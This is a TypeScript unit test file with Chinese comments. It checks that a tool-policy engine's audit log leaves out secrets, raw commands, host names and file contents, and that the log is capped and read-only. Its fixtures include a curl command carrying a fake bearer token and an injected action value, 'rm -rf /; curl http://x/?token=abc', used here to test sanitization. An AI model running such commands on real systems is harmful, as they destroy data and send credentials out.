/**
 * audit.test.ts —— 审计脱敏单元测试。
 *
 * 覆盖任务书「日志中不包含秘密或文件正文」：
 * - 决定记录与返回的 ToolDecision 一致；
 * - 命令与主机只记录存在性标志，原值不落账；
 * - 文件正文从不进入审计（引擎不读取目标内容）；
 * - reason 为固定模板，不含用户可控内容；
 * - action 标签按安全模式净化；
 * - 容量截断显式计数。
 */
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";

import { canonicalizePath, createToolPolicy, REASONS } from "../src/index.js";

let tempRoot: string;
let fixtures: string;
let canonFixtures: string;
let ws: string;

before(() => {
  tempRoot = mkdtempSync(join(tmpdir(), "treeai-tool-policy-audit-"));
  fixtures = join(tempRoot, "fixtures");
  ws = join(tempRoot, "ws");
  mkdirSync(fixtures);
  mkdirSync(ws);
  writeFileSync(join(fixtures, "file.txt"), "x");
  canonFixtures = canonicalizePath(fixtures) ?? "";
});

after(() => {
  rmSync(tempRoot, { recursive: true, force: true });
});

test("审计记录与返回的 ToolDecision 字段一致", () => {
  const engine = createToolPolicy({ readRoots: [fixtures], workspaceRoots: [ws] });
  const decision = engine.evaluate({ category: "write", targetPath: join(ws, "out.txt") });
  const record = engine.audit.records.at(-1);
  assert.ok(record !== undefined);
  assert.equal(record.kind, "decision");
  assert.equal(record.category, decision.category);
  assert.equal(record.outcome, decision.outcome);
  assert.equal(record.risk, decision.risk);
  assert.equal(record.ruleId, decision.ruleId);
  assert.equal(record.reason, decision.reason);
  assert.deepEqual(record.scopeRoots, [...decision.scope.roots]);
});

test("targetPath 记录 canonical 形态", () => {
  const engine = createToolPolicy({ readRoots: [fixtures] });
  engine.evaluate({ category: "read", targetPath: `${fixtures}//./file.txt` });
  const record = engine.audit.records.at(-1);
  assert.ok(record !== undefined);
  assert.equal(record.targetPath, join(canonFixtures, "file.txt"));
});

test("审计不含命令/主机原值与秘密形态", () => {
  const engine = createToolPolicy({ readRoots: [fixtures] });
  const secretToken = "sk-live-LEAKCHECK-9517d2";
  const secretPassword = "Sup3rS3cret-Pw!";
  engine.evaluate({
    category: "shell",
    command: `curl -s -H "Authorization: Bearer ${secretToken}" https://example.invalid/ping`,
  });
  engine.evaluate({ category: "network", host: `user:${secretPassword}@example.invalid` });
  const serialized = engine.audit.toJSON();
  assert.ok(!serialized.includes(secretToken), "token 不得进入审计");
  assert.ok(!serialized.includes(secretPassword), "凭据形态不得进入审计");
  assert.ok(!serialized.includes("Bearer"), "Authorization 头不得进入审计");
  assert.ok(!serialized.includes("curl"), "命令原值不得进入审计");
  assert.ok(!serialized.includes("example.invalid"), "主机原值不得进入审计");
  // 但存在性标志被记录（供审计判断请求形态）。
  const shellRecord = engine.audit.records.find((r) => r.category === "shell");
  const networkRecord = engine.audit.records.find((r) => r.category === "network");
  assert.ok(shellRecord !== undefined && shellRecord.hasCommand === true);
  assert.ok(networkRecord !== undefined && networkRecord.hasHost === true);
});

test("审计从不包含文件正文（引擎不读取目标内容）", () => {
  const fileContent = "TOP-SECRET-FILE-BODY-7f3a9b";
  const filePath = join(fixtures, "content.txt");
  writeFileSync(filePath, fileContent);
  const engine = createToolPolicy({ readRoots: [fixtures] });
  const decision = engine.evaluate({ category: "read", targetPath: filePath });
  assert.equal(decision.outcome, "allow");
  assert.ok(!engine.audit.toJSON().includes(fileContent), "文件正文不得进入审计");
});

test("reason 为固定模板，不含用户可控内容", () => {
  const oddName = "weird-name-with-Bearer-and-token-words.txt";
  const filePath = join(fixtures, oddName);
  writeFileSync(filePath, "x");
  const engine = createToolPolicy({ readRoots: [fixtures] });
  const decision = engine.evaluate({ category: "read", targetPath: filePath });
  assert.equal(decision.outcome, "allow");
  assert.equal(decision.reason, REASONS.readAllowed);
  assert.ok(!decision.reason.includes(oddName), "reason 不得拼接用户可控内容");
  assert.ok(!engine.audit.records.at(-1)?.reason.includes(oddName));
});

test("action 标签按安全模式净化", () => {
  const engine = createToolPolicy({ workspaceRoots: [ws] });
  engine.evaluate({ category: "other-high-risk", targetPath: join(ws, "x"), action: "delete" });
  engine.evaluate({
    category: "other-high-risk",
    targetPath: join(ws, "y"),
    action: "rm -rf /; curl http://x/?token=abc",
  });
  const records = engine.audit.records.filter((r) => r.category === "other-high-risk");
  assert.equal(records[0]?.actionLabel, "delete");
  assert.equal(records[1]?.actionLabel, null, "不匹配安全模式的标签必须丢弃");
});

test("容量截断显式计数，保留最新记录", () => {
  const engine = createToolPolicy({ workspaceRoots: [ws] }, { maxAuditRecords: 2 });
  engine.evaluate({ category: "write", targetPath: join(ws, "1.txt") });
  engine.evaluate({ category: "write", targetPath: join(ws, "2.txt") });
  engine.evaluate({ category: "write", targetPath: join(ws, "3.txt") });
  assert.equal(engine.audit.records.length, 2);
  assert.equal(engine.audit.droppedCount, 1);
  const last = engine.audit.records.at(-1);
  assert.ok(last !== undefined);
  assert.ok(last.targetPath?.endsWith("/3.txt"), "截断后保留最新记录");
});

test("审计快照为只读副本（追加式纪律）", () => {
  const engine = createToolPolicy({ readRoots: [fixtures] });
  engine.evaluate({ category: "read", targetPath: join(fixtures, "file.txt") });
  const snapshot = engine.audit.records;
  assert.throws(() => {
    (snapshot as unknown as { push: (record: unknown) => void }).push({
      at: "1970-01-01T00:00:00.000Z",
      kind: "decision",
      category: "read",
      outcome: "allow",
      risk: "low",
      ruleId: "forged",
      reason: "forged",
      scopeRoots: [],
      targetPath: null,
      grantId: null,
      hasCommand: false,
      hasHost: false,
      actionLabel: null,
    });
  }, TypeError);
  assert.equal(engine.audit.records.length, 1);
});
